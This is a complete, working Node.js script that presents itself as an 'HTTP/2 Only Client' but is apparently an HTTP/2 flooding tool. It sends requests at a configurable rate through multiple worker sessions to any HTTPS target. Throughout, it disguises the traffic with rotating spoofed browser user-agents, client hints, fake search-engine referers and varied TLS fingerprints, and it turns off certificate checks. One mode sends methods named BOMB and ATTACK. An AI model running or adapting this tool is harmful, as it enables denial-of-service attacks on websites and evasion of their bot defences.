#!/usr/bin/env node
/**
 * hfree — HTTP/2 Only Client
 *
 * Usage: node hfree.js <url> <time> <rate> [threads] [browser] [os] [referer] [method] [protocol]
 *   url     : Target HTTPS URL                          e.g. https://example.com
 *   time    : Duration in seconds                       e.g. 30
 *   rate    : Requests per second                       e.g. 5
 *   threads : Worker count (default: 1)                 e.g. 4
 *   browser : chrome|firefox|edge|opera|gecko|mixed     (default: mixed)
 *   os      : random|windows|macos|linux|iphone|android (default: random)
 *   referer : google|bing|yandex|brave|mixed            (default: mixed)
 *   method  : get|post|head|put|nonstandard             (default: get)
 *   protocol: tlsv1.0|tlsv1.1|tlsv1.2|tlsv1.3|mixed     (default: mixed)
 *
 * Examples:
 *   node hfree.js https://example.com 30 5
 *   node hfree.js https://example.com 30 5 4 chrome windows google get tlsv1.2
 *   node hfree.js https://example.com 60 10 8 firefox linux yandex nonstandard mixed
 */

"use strict";

const http2 = require("http2");
const tls = require("tls");
const { URL } = require("url");

// ─── Referer pools per engine ──────────────────────────────────────────────
const REFERER_POOLS = {
  google: [
    "https://www.google.com/",
    "https://www.google.co.id/",
    "https://www.google.co.uk/",
    "https://www.google.de/",
  ],
  bing: [
    "https://www.bing.com/",
    "https://www.bing.com/search?q=",
    "https://cn.bing.com/",
  ],
  yandex: ["https://yandex.com/", "https://yandex.ru/", "https://yandex.co/"],
  brave: [
    "https://search.brave.com/",
    "https://brave.com/",
    "https://search.brave.com/search?q=",
  ],
};
REFERER_POOLS.mixed = [
  ...REFERER_POOLS.google,
  ...REFERER_POOLS.bing,
  ...REFERER_POOLS.yandex,
  ...REFERER_POOLS.brave,
];

const LANGS = [
  "en-US,en;q=0.9",
  "en-GB,en;q=0.9",
  "en-US,en;q=0.8,fr;q=0.7",
  "en-US,en;q=0.9,de;q=0.8",
  "id-ID,id;q=0.9,en;q=0.8",
];
const FETCH_SITES = ["none", "same-origin", "cross-site"];
const rand = (arr) => arr[Math.floor(Math.random() * arr.length)];

// ─── UA database per browser × os ─────────────────────────────────────────
const UA_DB = {
  chrome: {
    windows: [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    ],
    macos: [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    ],
    linux: [
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    ],
    iphone: [
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.82 Mobile/15E148 Safari/604.1",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.0.0 Mobile/15E148 Safari/604.1",
    ],
    android: [
      "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    ],
  },
  firefox: {
    windows: [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    ],
    macos: [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:123.0) Gecko/20100101 Firefox/123.0",
    ],
    linux: [
      "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    ],
    iphone: [
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/124.0 Mobile/15E148 Safari/604.1",
    ],
    android: [
      "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
      "Mozilla/5.0 (Android 13; Mobile; rv:123.0) Gecko/123.0 Firefox/123.0",
    ],
  },
  edge: {
    windows: [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
      "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.2478.51",
    ],
    macos: [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    ],
    linux: [
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    ],
    iphone: [
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/124.0.0.0 Mobile/15E148 Safari/604.1",
    ],
    android: [
      "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36 EdgA/124.0.0.0",
    ],
  },
  opera: {
    windows: [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
    ],
    macos: [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0",
    ],
    linux: [
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0",
    ],
    iphone: [
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/4.3.1 Mobile/15E148",
    ],
    android: [
      "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36 OPR/79.0.0.0",
    ],
  },
  gecko: {
    windows: [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
      "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Waterfox/G6.0.9",
    ],
    macos: [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",
    ],
    linux: [
      "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
      "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    ],
    iphone: [
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/124.0 Mobile/15E148 Safari/604.1",
    ],
    android: [
      "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
    ],
  },
};

// Kumpulkan semua OS keys yang valid
const ALL_OS = ["windows", "macos", "linux", "iphone", "android"];

// Bangun pool UA sesuai browser + os
function buildUAPool(browserOpt, osOpt) {
  const browsers = browserOpt === "mixed" ? Object.keys(UA_DB) : [browserOpt];

  const osList = osOpt === "random" ? ALL_OS : [osOpt];

  const pool = [];
  for (const br of browsers) {
    const brData = UA_DB[br];
    if (!brData) continue;
    for (const os of osList) {
      if (brData[os]) pool.push(...brData[os]);
    }
  }

  if (pool.length === 0) {
    console.error(
      `Error: tidak ada UA untuk browser="${browserOpt}" os="${osOpt}"`,
    );
    process.exit(1);
  }
  return pool;
}

// ─── Detect browser engine dari UA ────────────────────────────────────────
function detectEngine(ua) {
  if (/Gecko\/20100101/.test(ua)) return "gecko";
  if (/Edg\//.test(ua)) return "edge";
  if (/OPR\//.test(ua)) return "opera";
  if (/Chrome\//.test(ua)) return "chrome";
  return "other";
}

// Extract versi dari UA
function chromeVer(ua) {
  const m = ua.match(/Chrome\/(\d+)/);
  return m ? m[1] : "124";
}
function firefoxVer(ua) {
  const m = ua.match(/Firefox\/(\d+)/);
  return m ? m[1] : "124";
}
function edgeVer(ua) {
  const m = ua.match(/Edg\/(\d+)/);
  return m ? m[1] : "124";
}
function operaVer(ua) {
  const m = ua.match(/OPR\/(\d+)/);
  return m ? m[1] : "109";
}

// ─── Build H2 headers sesuai engine ───────────────────────────────────────
function buildHeaders(ua, refererPool, methodOpt) {
  const engine = detectEngine(ua);
  const isMobile = /Mobile|Android|iPhone|iPad/.test(ua);

  // Parse HTTP Method
  let methodString = "GET";
  if (methodOpt === "post") methodString = "POST";
  else if (methodOpt === "head") methodString = "HEAD";
  else if (methodOpt === "put") methodString = "PUT";
  else if (methodOpt === "nonstandard") methodString = rand(["BOMB", "ATTACK", "GHOST", "ZOMBIE", "SMASH"]);

  // Accept header per engine
  const ACCEPT = {
    gecko:
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    edge: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    opera:
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    chrome:
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    other: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  };

  const isNavigate = methodString === "GET" || methodString === "HEAD";
  const isCrossSite = !parsedUrl.origin.includes("google") && !parsedUrl.origin.includes("bing"); // simplified assumption

  const base = {
    ":method": methodString,
    ":authority": parsedUrl.host,
    ":scheme": "https",
    ":path": parsedUrl.pathname + parsedUrl.search,
    "user-agent": ua,
    accept: isNavigate ? (ACCEPT[engine] || ACCEPT.other) : "*/*",
    "accept-encoding": engine === "gecko" ? "gzip, deflate, br" : "gzip, deflate, br, zstd",
    "accept-language": rand(LANGS),
    referer: rand(refererPool),
    "sec-fetch-site": isCrossSite ? "cross-site" : rand(["same-origin", "cross-site"]),
    "sec-fetch-mode": isNavigate ? "navigate" : "cors",
    "sec-fetch-dest": isNavigate ? "document" : "empty",
  };

  if (isNavigate) {
    base["sec-fetch-user"] = "?1";
  }

  if (methodString === "POST" || methodString === "PUT") {
    base["content-length"] = "0";
    base["content-type"] = "application/x-www-form-urlencoded";
    base["origin"] = `https://${parsedUrl.host}`;
  }

  // Chromium-family: tambah sec-ch-ua hints
  if (engine === "chrome" || engine === "edge" || engine === "opera") {
    let brand, ver;
    if (engine === "edge") {
      ver = edgeVer(ua);
      brand = `"Microsoft Edge";v="${ver}", "Chromium";v="${chromeVer(ua)}", "Not_A Brand";v="24"`;
    } else if (engine === "opera") {
      ver = operaVer(ua);
      brand = `"Opera";v="${ver}", "Chromium";v="${chromeVer(ua)}", "Not_A Brand";v="24"`;
    } else {
      ver = chromeVer(ua);
      brand = `"Google Chrome";v="${ver}", "Chromium";v="${ver}", "Not_A Brand";v="24"`;
    }

    const platform = /Windows/.test(ua)
      ? "Windows"
      : /Macintosh/.test(ua)
        ? "macOS"
        : /Linux|X11/.test(ua)
          ? "Linux"
          : /iPhone|iPad/.test(ua)
            ? "iOS"
            : "Android";

    Object.assign(base, {
      "sec-ch-ua": `${brand}`,
      "sec-ch-ua-mobile": isMobile ? "?1" : "?0",
      "sec-ch-ua-platform": `"${platform}"`,
      "sec-ch-ua-platform-version":
        platform === "Windows" ? '"15.0.0"' : '"14.4.0"',
      "sec-ch-ua-arch": isMobile ? '""' : '"x86"',
      "sec-ch-ua-bitness": isMobile ? '""' : '"64"',
      "sec-ch-ua-model": '""',
      "sec-ch-ua-full-version-list": `${brand}`,
      "upgrade-insecure-requests": "1",
      priority: "u=0, i",
    });
  }

  // Firefox/Gecko: tidak ada sec-ch-ua, tapi ada DNT
  if (engine === "gecko") {
    Object.assign(base, {
      "upgrade-insecure-requests": "1",
      dnt: "1",
      te: "trailers",
    });
  }

  return base;
}

// ─── Parse CLI ─────────────────────────────────────────────────────────────
const args = process.argv.slice(2);
const [targetUrl, timeArg, rateArg, threadsArg, browserArg, osArg, refererArg, httpMethodArg, protocolArg] =
  args;

const VALID_BROWSERS = ["chrome", "firefox", "edge", "opera", "gecko", "mixed"];
const VALID_OS = ["random", "windows", "macos", "linux", "iphone", "android"];
const VALID_REFERERS = ["google", "bing", "yandex", "brave", "mixed"];
const VALID_HTTP_METHODS = ["get", "post", "head", "put", "nonstandard"];
const VALID_PROTOCOLS = ["tlsv1.0", "tlsv1.1", "tlsv1.2", "tlsv1.3", "mixed"];

if (!targetUrl || !timeArg || !rateArg) {
  console.error(
    "\nUsage : node hfree.js <url> <time> <rate> [threads] [browser] [os] [referer] [httpMethod] [protocol]\n" +
      "  url     : Target HTTPS URL                            e.g. https://example.com\n" +
      "  time    : Duration in seconds                         e.g. 30\n" +
      "  rate    : Requests per second                         e.g. 5\n" +
      "  threads : Worker count              (default: 1)      e.g. 4\n" +
      "  browser : chrome|firefox|edge|opera|gecko|mixed       (default: mixed)\n" +
      "  os      : random|windows|macos|linux|iphone|android   (default: random)\n" +
      "  referer : google|bing|yandex|brave|mixed              (default: mixed)\n" +
      "  method  : get|post|head|put|nonstandard               (default: get)\n" +
      "  protocol: tlsv1.0|tlsv1.1|tlsv1.2|tlsv1.3|mixed       (default: mixed)\n\n" +
      "Examples:\n" +
      "  node hfree.js https://example.com 30 5\n" +
      "  node hfree.js https://example.com 30 5 4 chrome windows google get tlsv1.2\n" +
      "  node hfree.js https://example.com 60 10 8 firefox linux yandex\n",
  );
  process.exit(1);
}

const duration = parseFloat(timeArg);
const rate = parseFloat(rateArg);
const threads = threadsArg ? parseInt(threadsArg, 10) : 1;
const browserOpt = (browserArg || "mixed").toLowerCase();
const osOpt = (osArg || "random").toLowerCase();
const refererOpt = (refererArg || "mixed").toLowerCase();
const methodOpt = (httpMethodArg || "get").toLowerCase();
const protocolOpt = (protocolArg || "mixed").toLowerCase();

if (isNaN(duration) || duration <= 0) {
  console.error("Error: time must be > 0");
  process.exit(1);
}
if (isNaN(rate) || rate <= 0) {
  console.error("Error: rate must be > 0");
  process.exit(1);
}
if (isNaN(threads) || threads < 1) {
  console.error("Error: threads must be >= 1");
  process.exit(1);
}
if (!VALID_BROWSERS.includes(browserOpt)) {
  console.error(
    `Error: browser harus salah satu dari: ${VALID_BROWSERS.join("|")}`,
  );
  process.exit(1);
}
if (!VALID_OS.includes(osOpt)) {
  console.error(`Error: os harus salah satu dari: ${VALID_OS.join("|")}`);
  process.exit(1);
}
if (!VALID_REFERERS.includes(refererOpt)) {
  console.error(
    `Error: referer harus salah satu dari: ${VALID_REFERERS.join("|")}`,
  );
  process.exit(1);
}
if (!VALID_HTTP_METHODS.includes(methodOpt)) {
  console.error(
    `Error: method harus salah satu dari: ${VALID_HTTP_METHODS.join("|")}`,
  );
  process.exit(1);
}
if (!VALID_PROTOCOLS.includes(protocolOpt)) {
  console.error(
    `Error: protocol harus salah satu dari: ${VALID_PROTOCOLS.join("|")}`,
  );
  process.exit(1);
}

let parsedUrl;
try {
  parsedUrl = new URL(targetUrl);
} catch {
  console.error(`Error: invalid URL → ${targetUrl}`);
  process.exit(1);
}
if (parsedUrl.protocol !== "https:") {
  console.error("Error: hanya mendukung HTTPS. Gunakan https://...");
  process.exit(1);
}

// Build pools setelah validasi
const UA_POOL = buildUAPool(browserOpt, osOpt);
const REFERER_POOL = REFERER_POOLS[refererOpt] || REFERER_POOLS.mixed;

const TLS_MAP = {
  "tlsv1.0": "TLSv1",
  "tlsv1.1": "TLSv1.1",
  "tlsv1.2": "TLSv1.2",
  "tlsv1.3": "TLSv1.3",
};
const tlsMin = protocolOpt === "mixed" ? "TLSv1" : TLS_MAP[protocolOpt];
const tlsMax = protocolOpt === "mixed" ? "TLSv1.3" : TLS_MAP[protocolOpt];

// ─── Global state ──────────────────────────────────────────────────────────
let stopped = false;
let totalSent = 0;
let totalDone = 0;
let totalLatency = 0;
let detectedProto = "HTTP/2 + TLS (mendeteksi…)";
const counts = {};
const errors = {};

const TLS_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA";
const TLS_SIGALGS = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";

// ─── ALPN probe ────────────────────────────────────────────────────────────
function probeAlpn(hostname, port) {
  return new Promise((resolve, reject) => {
    const sock = tls.connect(
      {
        host: hostname,
        port,
        servername: hostname,
        ALPNProtocols: ["h2", "http/1.1"],
        minVersion: tlsMin,
        maxVersion: tlsMax,
        ciphers: TLS_CIPHERS,
        sigalgs: TLS_SIGALGS,
        ecdhCurve: "X25519:P-256:P-384",
        rejectUnauthorized: false,
        checkServerIdentity: () => undefined,
        timeout: 5000,
      },
      () => {
        const proto = sock.alpnProtocol;
        sock.destroy();
        if (proto === "h2") resolve();
        else
          reject(
            new Error(
              `Server tidak menegosiasikan h2 via ALPN (dijawab: "${proto || "none"}").\n` +
                `Pastikan server dikonfigurasi dengan HTTP/2 aktif.`,
            ),
          );
      },
    );
    sock.on("error", (e) =>
      reject(new Error(`TLS handshake gagal: ${e.message}`)),
    );
    sock.on("timeout", () => {
      sock.destroy();
      reject(new Error("ALPN probe timeout (5s)"));
    });
  });
}

// ─── Session pool — satu session per worker ────────────────────────────────
const pool = Array.from({ length: threads }, () => ({
  session: null,
  ready: false,
  connecting: false,
  queue: [],
  activeStreams: 0,
}));

const H2_OPTS = {
  rejectUnauthorized: false,
  checkServerIdentity: () => undefined,
  servername: parsedUrl.hostname,
  minVersion: tlsMin,
  maxVersion: tlsMax,
  ciphers: TLS_CIPHERS,
  sigalgs: TLS_SIGALGS,
  ecdhCurve: "X25519:P-256:P-384",
  settings: {
    headerTableSize: 65536,
    maxConcurrentStreams: 1000,
    initialWindowSize: 6291456,
    maxHeaderListSize: 262144,
    enablePush: false,
  },
};

function spawnSession(idx) {
  if (stopped) return;
  const slot = pool[idx];
  if (slot.connecting) return;

  slot.connecting = true;
  slot.ready = false;
  slot.session = null;

  const sess = http2.connect(`https://${parsedUrl.host}`, H2_OPTS);

  sess.once("connect", () => {
    const alpn = sess.socket && sess.socket.alpnProtocol;
    detectedProto =
      alpn === "h2"
        ? "HTTP/2 + TLS 1.3 (h2)"
        : `HTTP/2 session (ALPN: ${alpn || "?"})`;
    slot.session = sess;
    slot.ready = true;
    slot.connecting = false;
    const q = slot.queue.splice(0);
    for (const cb of q) cb(sess);
  });

  const onDead = () => {
    if (slot.session === sess) {
      slot.session = null;
      slot.ready = false;
      slot.connecting = false;
    }
    slot.activeStreams = 0;
    slot.queue.splice(0).forEach((cb) => cb(null));
    if (!stopped) setTimeout(() => spawnSession(idx), 300);
  };

  sess.on("error", onDead);
  sess.on("close", onDead);
  sess.on("goaway", onDead);

  const ht = setTimeout(() => {
    if (!slot.ready) sess.destroy();
  }, 6000);
  sess.once("connect", () => clearTimeout(ht));
}

function getSession(idx, callback) {
  const slot = pool[idx];
  if (slot.ready && slot.session && !slot.session.destroyed)
    return callback(slot.session);
  slot.queue.push(callback);
  if (!slot.connecting) spawnSession(idx);
}

// ─── Concurrent stream limit ───────────────────────────────────────────────
function maxStreams(sess) {
  const r = sess && sess.remoteSettings;
  return r && r.maxConcurrentStreams ? r.maxConcurrentStreams : 100;
}

// ─── Send one request ──────────────────────────────────────────────────────
function doRequest(idx) {
  const slot = pool[idx];
  if (slot.activeStreams >= maxStreams(slot.session)) return;

  getSession(idx, (sess) => {
    if (!sess || sess.destroyed) return;
    if (slot.activeStreams >= maxStreams(sess)) return;

    const ua = rand(UA_POOL);
    const start = Date.now();
    totalSent++;
    slot.activeStreams++;

    let req;
    try {
      req = sess.request(buildHeaders(ua, REFERER_POOL, methodOpt));
    } catch (e) {
      totalSent--;
      slot.activeStreams--;
      if (
        e.code !== "ERR_HTTP2_INVALID_SESSION" &&
        e.code !== "ERR_HTTP2_GOAWAY_SESSION"
      ) {
        errors[e.code || e.message.slice(0, 50)] =
          (errors[e.code || e.message.slice(0, 50)] || 0) + 1;
      }
      return;
    }

    req.setEncoding("utf8");
    let status = null;

    req.on("response", (hdrs) => {
      status = String(hdrs[":status"] || "0");
    });
    req.on("data", () => {});

    const done = (code) => {
      slot.activeStreams = Math.max(0, slot.activeStreams - 1);
      totalDone++;
      counts[code] = (counts[code] || 0) + 1;
      totalLatency += Date.now() - start;
    };

    req.on("end", () => done(status || "0"));
    req.on("error", (e) => {
      slot.activeStreams = Math.max(0, slot.activeStreams - 1);
      totalDone++;
      if (e.code === "ERR_HTTP2_STREAM_ERROR") {
        const rst = (e.message.match(/\d+/) || ["RST"])[0];
        const key = `RST_STREAM(${rst})`;
        errors[key] = (errors[key] || 0) + 1;
      } else {
        const key = e.code || e.message.slice(0, 50);
        errors[key] = (errors[key] || 0) + 1;
      }
    });

    req.setTimeout(10_000, () => req.close());
    req.end();
  });
}

// ─── Dashboard ─────────────────────────────────────────────────────────────
const C = {
  reset: "\x1b[0m",
  bold: "\x1b[1m",
  dim: "\x1b[2m",
  cyan: "\x1b[36m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  red: "\x1b[31m",
  gray: "\x1b[90m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m",
  clear: "\x1b[2J\x1b[H",
};

function statusLabel(c) {
  const m = {
    200: "OK",
    201: "Created",
    204: "No Content",
    301: "Moved",
    302: "Found",
    304: "Not Modified",
    400: "Bad Request",
    401: "Unauthorized",
    403: "Blocked",
    404: "Not Found",
    429: "Rate Limited",
    500: "Server Error",
    502: "Bad Gateway",
    503: "Unavailable",
    504: "Gateway Timeout",
  };
  if (m[c]) return m[c];
  if (c >= 200 && c < 300) return "Success";
  if (c >= 300 && c < 400) return "Redirect";
  if (c >= 400 && c < 500) return "Client Error";
  return "Server Error";
}
function statusColor(c) {
  if (c >= 200 && c < 300) return C.green;
  if (c >= 300 && c < 400) return C.yellow;
  return C.red;
}

// Label warna per browser
const BROWSER_COLOR = {
  chrome: "cyan",
  firefox: "magenta",
  edge: "blue",
  opera: "red",
  gecko: "magenta",
  mixed: "yellow",
};
function browserLabel() {
  const col = C[BROWSER_COLOR[browserOpt]] || C.cyan;
  return `${col}${browserOpt}${C.reset}`;
}

function renderDashboard(elapsed, finished) {
  const remaining = Math.max(0, duration - elapsed).toFixed(1);
  const progress = Math.min(1, elapsed / duration);
  const filled = Math.round(progress * 30);
  const bar = "█".repeat(filled) + "░".repeat(30 - filled);
  const avgLatency =
    totalDone > 0 ? (totalLatency / totalDone).toFixed(0) : "—";
  const actualRate = elapsed > 0 ? (totalSent / elapsed).toFixed(1) : "0.0";
  const activeSess = pool.filter((s) => s.ready).length;

  process.stdout.write(C.clear);
  console.log(
    `${C.bold}${C.cyan} hfree${C.reset}  ${C.dim}HTTP/2 Only Client${C.reset}`,
  );
  console.log(`${C.gray}${"─".repeat(56)}${C.reset}`);
  console.log(`  ${C.dim}Target  ${C.reset}  ${targetUrl}`);
  console.log(
    `  ${C.dim}Protocol${C.reset}  ${C.bold}${detectedProto}${C.reset}`,
  );
  console.log(
    `  ${C.dim}Browser ${C.reset}  ${browserLabel()}  ${C.dim}OS:${C.reset} ${C.yellow}${osOpt}${C.reset}  ${C.dim}Referer:${C.reset} ${C.green}${refererOpt}${C.reset}  ${C.dim}Method:${C.reset} ${C.magenta}${methodOpt.toUpperCase()}${C.reset}  ${C.dim}TLS:${C.reset} ${C.blue}${protocolOpt.toUpperCase()}${C.reset}`,
  );
  console.log(
    `  ${C.dim}UA Pool ${C.reset}  ${C.gray}${UA_POOL.length} user-agents${C.reset}`,
  );
  console.log(`  ${C.dim}Sessions${C.reset}  ${activeSess}/${threads} active`);
  console.log(
    `  ${C.dim}Rate    ${C.reset}  ${rate} req/s × ${threads} workers  →  actual ${C.bold}${actualRate}${C.reset} req/s`,
  );
  console.log(
    `  ${C.dim}Duration${C.reset}  ${duration}s  →  ${finished ? `${C.green}done${C.reset}` : `${remaining}s remaining`}`,
  );
  console.log();
  console.log(`  ${C.cyan}${bar}${C.reset}  ${(progress * 100).toFixed(0)}%`);
  console.log();
  console.log(
    `  ${C.dim}Sent${C.reset}  ${C.bold}${totalSent}${C.reset}   ${C.dim}Done${C.reset}  ${C.bold}${totalDone}${C.reset}   ${C.dim}Avg latency${C.reset}  ${C.bold}${avgLatency}ms${C.reset}`,
  );
  console.log();

  const codes = Object.keys(counts).sort((a, b) => counts[b] - counts[a]);
  if (codes.length === 0) {
    console.log(`  ${C.gray}waiting for responses…${C.reset}`);
  } else {
    console.log(`  ${C.bold}Status Breakdown${C.reset}`);
    for (const code of codes) {
      const n = counts[code];
      const col = statusColor(Number(code));
      const lbl = statusLabel(Number(code));
      const bar = "▪".repeat(Math.min(20, Math.ceil((n / totalDone) * 20)));
      console.log(
        `  ${col}${String(code).padEnd(4)}${C.reset} ${String(n).padStart(7)}×  ${col}${lbl.padEnd(14)}${C.reset} ${C.gray}${bar}${C.reset}`,
      );
    }
  }

  const errKeys = Object.keys(errors);
  if (errKeys.length) {
    console.log();
    console.log(`  ${C.bold}${C.red}Errors${C.reset}`);
    for (const k of errKeys)
      console.log(`  ${C.red}${k.padEnd(32)}${C.reset} ${errors[k]}×`);
  }

  if (finished) {
    console.log();
    console.log(`${C.gray}${"─".repeat(56)}${C.reset}`);
    console.log(
      `  ${C.green}${C.bold}Completed.${C.reset}  ${totalSent} requests in ${elapsed.toFixed(1)}s`,
    );
  } else {
    console.log(`\n  ${C.gray}Ctrl+C to stop early${C.reset}`);
  }
}

// ─── Boot ──────────────────────────────────────────────────────────────────
(async () => {
  const port = parseInt(parsedUrl.port || "443", 10);

  try {
    await probeAlpn(parsedUrl.hostname, port);
    detectedProto = "HTTP/2 + TLS 1.3 (h2)";
  } catch (err) {
    console.error(`\n[FATAL] ${err.message}\n`);
    process.exit(1);
  }

  for (let i = 0; i < threads; i++) spawnSession(i);

  const startTime = Date.now();
  const intervalMs = 1000 / rate;

  const workerTimers = Array.from({ length: threads }, (_, i) =>
    setInterval(() => {
      if (stopped) return;
      if ((Date.now() - startTime) / 1000 >= duration) return;
      doRequest(i);
    }, intervalMs),
  );

  const uiTimer = setInterval(() => {
    renderDashboard((Date.now() - startTime) / 1000, false);
  }, 250);

  function shutdown() {
    if (stopped) return;
    stopped = true;
    clearInterval(uiTimer);
    for (const t of workerTimers) clearInterval(t);
    const elapsed = (Date.now() - startTime) / 1000;
    for (const slot of pool) {
      try {
        if (slot.session) slot.session.close();
      } catch {}
    }
    setTimeout(() => {
      renderDashboard(elapsed, true);
      process.exit(0);
    }, 600);
  }

  setTimeout(shutdown, duration * 1000);
  process.on("SIGINT", shutdown);
})();
